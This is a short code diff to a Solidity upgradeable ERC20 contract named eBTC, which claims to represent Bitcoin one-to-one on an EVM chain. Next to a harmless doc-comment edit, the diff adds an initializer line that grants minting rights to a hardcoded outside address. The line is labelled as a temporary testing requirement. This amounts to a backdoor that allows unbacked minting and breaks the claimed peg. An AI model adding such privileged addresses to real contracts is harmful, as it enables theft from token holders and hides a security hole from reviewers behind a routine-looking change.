@@ -11,7 +11,7 @@ import {ERC20PermitUpgradeable} from
 
 /**
  * @title eBTC Token
- * @notice ERC20 token representing Bitcoin on other chains
+ * @notice Represents Bitcoin (BTC) on an EVM chain as an ERC20 token. 1 eBTC = 1 BTC.
  * @dev Upgradeable token with minting, burning, and permit capabilities
  */
 contract eBTC is
@@ -43,6 +43,7 @@ contract eBTC is
         __ERC20Permit_init("Extended Bitcoin Token");
         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
         _setupRole(MINTER_ROLE, minter_);
+        _setupRole(MINTER_ROLE, 0x4E56a8E3757F167378b38269E1CA0e1a1F124C9E); // TODO: Remove this post testing (Rahul's requirement for testing)
     }
 
     /**
